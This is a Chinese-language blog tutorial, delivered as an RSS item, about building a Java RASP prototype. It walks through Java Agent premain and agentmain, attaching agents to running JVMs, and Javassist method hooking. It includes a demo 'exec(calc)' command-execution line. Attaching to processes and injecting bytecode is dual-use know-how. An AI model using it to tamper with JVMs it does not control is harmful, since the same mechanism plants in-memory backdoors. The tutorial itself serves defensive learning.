<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>F4miti0n</title><description>Blog</description><link>https://f4miti0n.github.io/</link><language>en</language><item><title>从零开始的RASP学习</title><link>https://f4miti0n.github.io/posts/raspdemo/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/raspdemo/</guid><pubDate>Sun, 10 Mar 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;前置介绍&lt;/h2&gt;
&lt;p&gt;运行时应用程序自我保护（RASP）是一种在应用上运行的技术，旨在实时检测针对应用程序的攻击。它将防护功能“注入”到应用程序中，与应用程序融为一体，通过Hook少量关键函数来实时观测程序运行期间的内部情况。当应用出现可疑行为时，RASP根据当前上下文环境精准识别攻击事件，并给予实时阻断，使应用程序具备自我防护能力，而不需要进行人工干预。&lt;/p&gt;
&lt;p&gt;Java中的RASP主要作用就是Hook掉了一些&lt;code&gt;恶意类&lt;/code&gt;​​，比如&lt;code&gt;Runtime&lt;/code&gt;​​、&lt;code&gt;ProcessBuilder&lt;/code&gt;​其中​。&lt;code&gt;Runtime.exec&lt;/code&gt;​​调用的是&lt;code&gt;ProcessBuilder.start&lt;/code&gt;​​,&lt;code&gt;ProcessBuilder.start&lt;/code&gt;​​的底层会调用&lt;code&gt;ProcessImpl&lt;/code&gt;​​类。那么这时候只需要去Hook掉&lt;code&gt;ProcessImpl&lt;/code&gt;​​就无法进行执行命令了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/RASPHook.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Java Agent机制&lt;/h2&gt;
&lt;p&gt;提到RASP就绕不过Java Agent。一句话简单总结一下二者关系，&lt;strong&gt;Java Agent 是一种通用的机制，而RASP 是 Java Agent 专注于安全领域的一种特定用途&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Java Agent&lt;/strong&gt; 就像一个秘密特工，悄悄地在 Java 应用程序的幕后工作。它是一种特殊的软件，可以附加到运行中的 Java 进程，而无需修改应用程序的代码，即可对目标JVM造成影响，有点类似于之前写Frida的感觉，其中Java Agent有以下这么几个比较重要的特点或者说是功能需要我们掌握一下。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;附加（Attachment）&lt;/strong&gt;：Java Agent 使用 &lt;code&gt;-javaagent&lt;/code&gt; 命令行选项附加到运行中的 Java 进程。这个选项指定了 Java Agent JAR 文件的路径。当 Java 进程启动时，Agent 被加载。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;字节码增强（Instrumentation）&lt;/strong&gt;：Java Agent 使用字节码增强技术来修改或增强 Java 类。它可以在方法前后添加代码、更改方法体，甚至创建新的类。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;生命周期钩子（Lifecycle Hooks）&lt;/strong&gt;：Java Agent 有生命周期钩子，比如 &lt;code&gt;premain&lt;/code&gt; 和 &lt;code&gt;agentmain&lt;/code&gt;。
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;premain&lt;/code&gt;：在应用程序的 &lt;code&gt;main&lt;/code&gt; 方法之前执行。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;agentmain&lt;/code&gt;：动态执行（例如，附加到运行中的进程时）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类转换（Class Transformation）&lt;/strong&gt;：Agent 可以使用 &lt;code&gt;ClassFileTransformer&lt;/code&gt; 转换类。它拦截类加载并修改字节码。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;光看文字必然学不出来什么东西，让我们动手实践一下&lt;/p&gt;
&lt;h3&gt;Agent 实例（一）&lt;/h3&gt;
&lt;p&gt;通常情况下，我们可以用以下命令启动Agent机制。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;java -javaagent:/path/to/myagent.jar -jar myapp.jar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;j这里主要看到&lt;code&gt;-javaagent&lt;/code&gt;这个参数，&lt;code&gt;javaagent&lt;/code&gt;是java命令提供的一个参数，这个参数可以指定一个jar包，在真正的程序没有运行之前先运行指定的jar包。并且该jar包有两个要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;jar包的MANIFEST.MF文件必须指定Premain-Class&lt;/li&gt;
&lt;li&gt;Premain-Class指定的类必须实现premain()方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;值得一提的是，这里的javaagent可以指定多个jar，jvm会依次执行不同的jar中&lt;code&gt;PreMainclass#premain()&lt;/code&gt;方法，而premain方法则有两种定义方式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public static void premain(String agentArgs, Instrumentation inst)

public static void premain(String agentArgs)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此处会优先调用第一种写法。这种方法可以在JDK1.5及之后的版本使用。现在，我们开始着手创造第一个&lt;code&gt;agent&lt;/code&gt;，打开idea随便起一个maven项目，并将以下内容写入&lt;code&gt;pom.xml&lt;/code&gt;中&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;build&amp;gt;
&amp;lt;plugins&amp;gt;
&amp;lt;plugin&amp;gt;  
    &amp;lt;groupId&amp;gt;org.apache.maven.plugins&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;maven-jar-plugin&amp;lt;/artifactId&amp;gt;  
	&amp;lt;configuration&amp;gt;        
	    &amp;lt;archive&amp;gt;            
		    &amp;lt;manifestEntries&amp;gt;                
			    &amp;lt;Premain-Class&amp;gt;org.example.PreMain&amp;lt;/Premain-Class&amp;gt;  
			    &amp;lt;Can-Redefine-Classes&amp;gt;true&amp;lt;/Can-Redefine-Classes&amp;gt;  
			    &amp;lt;Can-Retransform-Classes&amp;gt;true&amp;lt;/Can-Retransform-Classes&amp;gt;  
		    &amp;lt;/manifestEntries&amp;gt;
		&amp;lt;/archive&amp;gt;
	&amp;lt;/configuration&amp;gt;
&amp;lt;/plugin&amp;gt;
&amp;lt;/plugins&amp;gt;
&amp;lt;/build&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后再准备好&lt;code&gt;PreMain.java&lt;/code&gt;，这个&lt;code&gt;transform&lt;/code&gt;之前没有接触过，其参数所代表实际含义如下所示，有兴趣可以看看&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class PreMain {  
    public static void premain(String agentArgs, Instrumentation inst){  
        System.out.println(&quot;agentArgs:&quot; + agentArgs);  
        inst.addTransformer(new DefineTransformer(), true);  
        //通过调用 addTransformer 方法注册类转换器后，当类被加载到内存时，Instrumentation 实例会调用相应的类转换器的transform方法。
    }  

// ClassFileTransformer 是 Java Instrumentation API 的一部分，用于在类字节码加载到 JVM 之前对其进行修改。
    static class DefineTransformer implements ClassFileTransformer{  
        @Override  
        public byte[] transform(ClassLoader loader, String className, Class&amp;lt;?&amp;gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {  
            System.out.println(&quot;premain load Class: &quot; + className);  // 注意这里的输出  
            return classfileBuffer;  
        }  
    }
    //transform 方法的主要作用是在类被加载到 JVM 之前提供一个机会来查看和/或修改类的字节码。这是 Java Instrumentation API 的核心部分  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ClassLoader loader&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;这是要转换的类的类加载器。如果类是由引导类加载器加载的，则此参数可能为 &lt;code&gt;null&lt;/code&gt;。类加载器是 Java 中用于加载类文件（&lt;code&gt;.class&lt;/code&gt; 文件）到 JVM 的组件。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;String className&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;完全限定的类名，这个名称表示当前正在被 JVM 加载的类。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;classBeingRedefined&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;如果正在重新定义的类不是 &lt;code&gt;null&lt;/code&gt;，则这是一个对该类的引用。在正常类加载过程中，这个参数通常是 &lt;code&gt;null&lt;/code&gt;。它只在使用了类重新定义或类重转换功能时才有值，这些功能允许在运行时动态修改类的定义。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ProtectionDomain protectionDomain&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;这是类的保护域。保护域是与类关联的一组权限，这些权限由类的加载器在类加载时赋予。保护域可以包含从哪个位置加载类的信息、类签名的信息，以及类可以执行的操作的权限信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;byte[] classfileBuffer&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;这是类的原始字节码数组。这些是从 &lt;code&gt;.class&lt;/code&gt; 文件中读取的未经修改的字节码。在 &lt;code&gt;transform&lt;/code&gt; 方法中，我们可以分析这些字节码、修改它们或者返回原始字节码。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;准备完毕之后拿maven打个包
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240305133230.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到这里我们的agent包就搞好了，再接着准备一下运行的jar包，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
public class Main {  
    public static void main(String[] args) {  
        System.out.println(&quot;Main.main() in test project&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同样还是用maven打包，只需要在&lt;code&gt;&amp;lt;manifestEntries&amp;gt;&lt;/code&gt;标签下添加一个&lt;code&gt;&amp;lt;Main-Class&amp;gt;&lt;/code&gt;即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240305134658.png&quot; alt=&quot;&quot; /&gt;
运行结果如下，可以看到premain先按照逻辑输出了加载的各种类，然后再main执行，最后结束时，premain还加载了一些结束时需要的类，到此agent机制我们就算是碰到一点点门槛了。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240305135005.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Agent实例（二）&lt;/h3&gt;
&lt;p&gt;前面的方法需要在main函数启动前执行agent，但有些时候，jvm已经启动了，而且服务不能轻易暂停，这时候我们就可以引入此处要介绍的Attach机制了。jdk1.6之后在Instrumentation中添加了一种agentmain的代理方法，可以在main函数执行之后再运行。和premain函数一样，开发者可以编写一个包含agentmain函数的Java类，它也有两种写法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public static void agentmain (String agentArgs, Instrumentation inst)
//还是第一种优先调用
public static void agentmain (String agentArgs)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;attach机制的具体实现在&lt;code&gt;com.sun.tools.attach&lt;/code&gt;中，这里介绍如下两个关键类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;VirtualMachine&lt;/code&gt; 字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息(比如获取内存dump、线程dump，类信息统计(比如已加载的类以及实例个数等)， loadAgent，Attach 和 Detach （Attach 动作的相反行为，从 JVM 上面解除一个代理）等方法，可以实现的功能可以说非常之强大 。&lt;strong&gt;该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;代理类注入操作只是它众多功能中的一个，通过&lt;code&gt;loadAgent&lt;/code&gt;方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，&lt;strong&gt;该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载&lt;/strong&gt;。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;VirtualMachineDescriptor&lt;/code&gt; 则是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;具体实现过程：&lt;/strong&gt; 通过VirtualMachine类的&lt;code&gt;attach(pid)&lt;/code&gt;方法，便可以attach到一个运行中的java进程上，之后便可以通过&lt;code&gt;loadAgent(agentJarPath)&lt;/code&gt;来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。&lt;/p&gt;
&lt;p&gt;这里跟着实操一下，首先是起一个可以长时间运行的jar包，打包之类的过程不再细谈，直接看源码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;
public class Main {
    public static void main(String[] args) throws InterruptedException {
        System.out.println(&quot;Main.main() in test project start!!&quot;);
        Thread.sleep(300000000);
        System.out.println(&quot;Main.main() in test project end!!&quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下所示，这个32420的pid我们记录一下，之后要用到。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240305190302.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240305190241.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;整完这个jar包，我们再整一个agent包，其中pom.xml部分把&lt;code&gt;&amp;lt;Agent-Class&amp;gt;org.example.AgentMain&amp;lt;/Agent-Class&amp;gt;&lt;/code&gt;添加到&lt;code&gt;manifestEntries&lt;/code&gt;即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class AgentMain {  
    public static void agentmain(String agentArgs, Instrumentation instrumentation) {  
        System.out.println(&quot;agentmain start!&quot;);  
        System.out.println(instrumentation.toString());  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打完Jar包之后，我们直接在idea里起个java程序，正儿八经开始我们的测试，这里可能会报不存在&lt;code&gt;com.sun.tools&lt;/code&gt;，手动添加一下tools.jar就行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import java.io.IOException;  
import com.sun.tools.attach.AgentInitializationException;  
import com.sun.tools.attach.AgentLoadException;  
import com.sun.tools.attach.AttachNotSupportedException;  
import com.sun.tools.attach.VirtualMachine;  
  
  
public class AttachTest {  
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {  
        VirtualMachine attach = VirtualMachine.attach(&quot;32420&quot;);  // 刚才的jvm的进程号  
        attach.loadAgent(&quot;F:\\RaspDemo2\\Myagent.jar&quot;);  
        attach.detach();  
        System.out.println(&quot;xxxx&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240305191529.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到运行结果发生了改变，在&lt;code&gt;Test.jar&lt;/code&gt;中成功执行了&lt;code&gt;agentmain()&lt;/code&gt;的逻辑，拿到了&lt;code&gt;Instrumentation&lt;/code&gt;对象。之后我们就可以通过对Instrumentation对象添加transformer类，来实现类转换(Class Transform)，也就是在transform函数中结合修改字节码的方法(ASM、Javassist、cglib等)来进一步实现RASP。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240305191804.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;RASP简易Demo&lt;/h2&gt;
&lt;h3&gt;前置探索&lt;/h3&gt;
&lt;p&gt;在前面的例子中，我们可以通过&lt;code&gt;Instrumentation&lt;/code&gt;对象来添加 &lt;code&gt;Transformer&lt;/code&gt;来对对加载的类进行动态修改，那么显然我们可以通过对危险类进行动态修改监听来实现RASP。但实际情况确往往没有这么简单，我们可以用下面手敲下面几个例子来做个简单分析。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Main&lt;/code&gt;入口类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class Main {  
    public static class A{  
        public void t(){System.out.println(&quot;Main$A.t()&quot;);}  
    }  
  
    public static void main(String[] args) throws InterruptedException, IOException {  
        System.out.println(&quot;-------Main.main() start-------&quot;);  
        Runtime.getRuntime().exec(&quot;calc&quot;);  
        String a = &quot;a&quot;;  
        System.out.println(a);  
        A a1 = new A();  
        a1.t();  
        System.out.println(&quot;-------Main.main() end-------&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;PreMain&lt;/code&gt;类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class PreMain {  
    public static void premain(String agentArgs, Instrumentation inst) throws IOException {  
        System.out.println(&quot;++++++++Premain start++++++++&quot;);  
        System.out.println(ClassLoader.getSystemClassLoader().toString());  
        // 查看当前代理类是被哪个类加载器加载的  
        inst.addTransformer(new DefineTransformer(), true);  
        System.out.println(&quot;++++++++Premain end++++++++&quot;);  
    }  
  
    public static class DefineTransformer implements ClassFileTransformer {  
        @Override  
        public byte[] transform(ClassLoader loader, String className, Class&amp;lt;?&amp;gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {  
            System.out.println(className.toString() + &quot;    &quot; + loader.toString()); 
             // 类名 和 类加载器  
            System.out.println(&quot;&quot;);  
            return classfileBuffer;  
        }  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;按照之前的配置打jar包运行，结果如下
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240306203221.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;注意一下，这里的PreMain和Main这种我们自己编写的类都是由&lt;code&gt;AppClassLoader&lt;/code&gt;来进行加载的，非常符合我们对于双亲委派的认知，但这种加载方式却会对我们RASP实现造成一定的干扰，我们跟着看下两个比较简单的例子。先将如下两个部分插入pom.xml对应位置中去&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;plugin&amp;gt;  
    &amp;lt;groupId&amp;gt;org.apache.maven.plugins&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;maven-shade-plugin&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;3.2.4&amp;lt;/version&amp;gt;  
    &amp;lt;executions&amp;gt;
	    &amp;lt;execution&amp;gt;
		    &amp;lt;phase&amp;gt;package&amp;lt;/phase&amp;gt;  
            &amp;lt;goals&amp;gt;                
	            &amp;lt;goal&amp;gt;shade&amp;lt;/goal&amp;gt;  
            &amp;lt;/goals&amp;gt;
            &amp;lt;configuration&amp;gt;
                &amp;lt;transformers&amp;gt;
                    &amp;lt;transformer implementation=&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;&amp;gt;  
                        &amp;lt;!-- 指定Agent主类 --&amp;gt;  
                        &amp;lt;manifestEntries&amp;gt;  
                            &amp;lt;Premain-Class&amp;gt;org.example.PreMain&amp;lt;/Premain-Class&amp;gt;  
                            &amp;lt;Main-Class&amp;gt;org.example.Main&amp;lt;/Main-Class&amp;gt;  
                            &amp;lt;Agent-Class&amp;gt;org.example.AgentMain&amp;lt;/Agent-Class&amp;gt;  
                            &amp;lt;Can-Redefine-Classes&amp;gt;true&amp;lt;/Can-Redefine-Classes&amp;gt;  
                            &amp;lt;Can-Retransform-Classes&amp;gt;true&amp;lt;/Can-Retransform-Classes&amp;gt;  
                        &amp;lt;/manifestEntries&amp;gt;
                    &amp;lt;/transformer&amp;gt;
                &amp;lt;/transformers&amp;gt;
            &amp;lt;/configuration&amp;gt;        
            &amp;lt;/execution&amp;gt;    
    &amp;lt;/executions&amp;gt;
&amp;lt;/plugin&amp;gt;


&amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;org.javassist&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;javassist&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;3.25.0-GA&amp;lt;/version&amp;gt;  
&amp;lt;/dependency&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后于org.example创建一个被代理的A类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
public class A {  
    public void call(){  
        System.out.println(&quot;The A is called!&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改PreMain代码，对A类的call方法进行代理拦截，具体实现主要依赖javasist修改字节码来完成。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import java.lang.instrument.ClassFileTransformer;  
import java.lang.instrument.IllegalClassFormatException;  
import java.lang.instrument.Instrumentation;  
import java.security.ProtectionDomain;  
import java.io.IOException;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtMethod;  
import javassist.LoaderClassPath;  
  
public class PreMain {  
    public static void premain(String agentArgs, Instrumentation inst) {  
        System.out.println(&quot;++++++++Premain start++++++++&quot;);  
        inst.addTransformer(new DefineTransformer(), true);  
        System.out.println(&quot;++++++++Premain end++++++++&quot;);  
    }  
  
    public static class DefineTransformer implements ClassFileTransformer {  
        @Override  
        public byte[] transform(ClassLoader loader, String className, Class&amp;lt;?&amp;gt; classBeingRedefined,  
                                ProtectionDomain protectionDomain, byte[] classfileBuffer)  
                throws IllegalClassFormatException {  
            if (className.equals(&quot;org/example/A&quot;)) {  
                try {  
                    ClassPool classPool = ClassPool.getDefault();  
                    classPool.appendClassPath(new LoaderClassPath(loader));  
                    CtClass ctClass = classPool.get(&quot;org.example.A&quot;);  
                    CtMethod method = ctClass.getDeclaredMethod(&quot;call&quot;);  
  
                    method.insertBefore(&quot;{ System.out.println(\&quot;Before call method\&quot;); }&quot;);  // 在call方法执行前插入代码  
                    byte[] byteCode = ctClass.toBytecode();  
                    ctClass.detach();  
                    return byteCode;  
                } catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
            return classfileBuffer;  
        }  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Main这块也做个小改，调用a.call()&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
import java.io.IOException;  
public class Main {  
    public static void main(String[] args) throws Exception {  
        System.out.println(&quot;-------Main.main() start-------&quot;);  
        A a = new A();  
        a.call();  
        System.out.println(&quot;-------Main.main() end-------&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下，成功代理拦截&lt;code&gt;A#call()&lt;/code&gt;。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Raspdemo1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;理论上通过这种方法，我们就可以实现对任意method的拦截修改，不过这里还是要改一改代码接着研究，&lt;code&gt;Main&lt;/code&gt;的类源码如下所示，插了一段zip的压缩代码和经典弹计算机，重点看下我下面贴的这张图，此处的&lt;code&gt;newFileSystem&lt;/code&gt;最终会调用到&lt;code&gt;ZipFileSystemProvider#newFileSystem()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
import java.io.IOException;  
import java.net.URI;  
import java.nio.file.*;  
import java.util.HashMap;  
import java.util.Map;  
  
public class Main {  
    public static void main(String[] args) throws Exception {  
        System.out.println(&quot;-------Main.main() start-------&quot;);  
        A a = new A();  
        Runtime.getRuntime().exec(&quot;calc&quot;);  
        Path zipPath = Paths.get(&quot;example.zip&quot;);  
        URI uri = URI.create(&quot;jar:&quot; + zipPath.toUri());  
        Map&amp;lt;String, String&amp;gt; env = new HashMap&amp;lt;&amp;gt;();  
        env.put(&quot;create&quot;, &quot;true&quot;);  
        try (FileSystem zipfs = FileSystems.newFileSystem(uri, env)) {  
            Path externalTxtFile = Paths.get(&quot;F:\\test.txt&quot;);  
            Path pathInZipfile = zipfs.getPath(&quot;/somefile.txt&quot;);  
            // Copy a file into the zip file  
            Files.copy(externalTxtFile, pathInZipfile, StandardCopyOption.REPLACE_EXISTING);  
        }  
        System.out.println(&quot;-------Main.main() end-------&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240310212857.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PreMain&lt;/code&gt;代码如下，拦截&lt;code&gt;ZipFileSystemProvider#newFileSystem()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class PreMain {  
    public static void premain(String agentArgs, Instrumentation inst) {  
        System.out.println(&quot;++++++++Premain start++++++++&quot;);  
        inst.addTransformer(new DefineTransformer(), true);  
        System.out.println(&quot;++++++++Premain end++++++++&quot;);  
    }  
  
    public static class DefineTransformer implements ClassFileTransformer {  
        @Override  
        public byte[] transform(ClassLoader loader, String className, Class&amp;lt;?&amp;gt; classBeingRedefined,  
                                ProtectionDomain protectionDomain, byte[] classfileBuffer)  
                throws IllegalClassFormatException {  
            if (className.equals(&quot;com/sun/nio/zipfs/ZipFileSystemProvider&quot;)) {  
                try {  
                    ClassPool classPool = ClassPool.getDefault();  
                    classPool.appendClassPath(new LoaderClassPath(loader));  
                    CtClass ctClass = classPool.get(&quot;com.sun.nio.zipfs.ZipFileSystemProvider&quot;);  
                    CtMethod method = ctClass.getDeclaredMethod(&quot;newFileSystem&quot;);  
  
                    method.insertBefore(&quot;{ System.out.println(\&quot;Before call method\&quot;); }&quot;);  // 在call方法执行前插入代码  
                    byte[] byteCode = ctClass.toBytecode();  
                    ctClass.detach();  
                    return byteCode;  
                } catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
            return classfileBuffer;  
        }  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拦截是成功的，但让我们继续换一种拦截方式看看
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240311004150.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class PreMain {  
    public static void premain(String agentArgs, Instrumentation inst) {  
        System.out.println(&quot;++++++++Premain start++++++++&quot;);  
        inst.addTransformer(new DefineTransformer(), true);  
        System.out.println(&quot;++++++++Premain end++++++++&quot;);  
    }  
  
    public static class DefineTransformer implements ClassFileTransformer {  
        @Override  
        public byte[] transform(ClassLoader loader, String className, Class&amp;lt;?&amp;gt; classBeingRedefined,  
                                ProtectionDomain protectionDomain, byte[] classfileBuffer)  
                throws IllegalClassFormatException {  
            if (className.equals(&quot;com/sun/nio/zipfs/ZipFileSystemProvider&quot;)) {  
                System.out.println(&quot;类名:&quot;+className+&quot;    类加载器:&quot;+loader.toString());  
                System.out.println(ClassLoader.getSystemClassLoader());  
                try {  
                    ClassPool classPool = ClassPool.getDefault();  
                    classPool.appendClassPath(new LoaderClassPath(loader));  
                    CtClass ctClass = classPool.get(&quot;com.sun.nio.zipfs.ZipFileSystemProvider&quot;);  
                    CtMethod method = ctClass.getDeclaredMethod(&quot;newFileSystem&quot;);  
  
                    // 在方法执行前插入对 org.example.B.before 的调用  
                    String codeToInsert = &quot;org.example.B.before();&quot;;  
                    method.insertBefore(codeToInsert);  
  
                    byte[] byteCode = ctClass.toBytecode();  
                    ctClass.detach();  
                    return byteCode;  
                } catch (Exception e) {  
                    e.printStackTrace();  
                }  
            }  
            return classfileBuffer;  
        }  
    }  
}
---------------------------------------------------------------------------------
public class B {  
    public static void before(){  
        System.out.println(&quot;B called&quot;);  
    }  
}
--------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现提示&lt;code&gt;ClassNotFound&lt;/code&gt;，这里的原因可以归结到双亲委派这一块。虽然同样都是用javaasist修改字节码，但法一的修改方式并不涉及到类加载层面的问题，而法二&lt;code&gt;method.insertBefore(&quot;org.example.B.before();&quot;) &lt;/code&gt;却并不尽然地对&lt;code&gt;org.example.B&lt;/code&gt;进行了类加载。在法二形势下，用来加载&lt;code&gt;ZipFileSystem&lt;/code&gt; 的&lt;code&gt;ExtClassloader&lt;/code&gt;被强行用来加载本该由&lt;code&gt;AppClassLoader&lt;/code&gt;进行加载的&lt;code&gt;org.example.B&lt;/code&gt;，依据双亲委派原则，&lt;code&gt;ExtClassLoader&lt;/code&gt;在找不到类的情况只得向上委派给更高层级的&lt;code&gt;BootstrapClassLoader&lt;/code&gt;，而无法将问题抛给更低层级的&lt;code&gt;AppClassLoader&lt;/code&gt;，最终导致&lt;code&gt;ClassNotFound&lt;/code&gt;。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240311004452.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
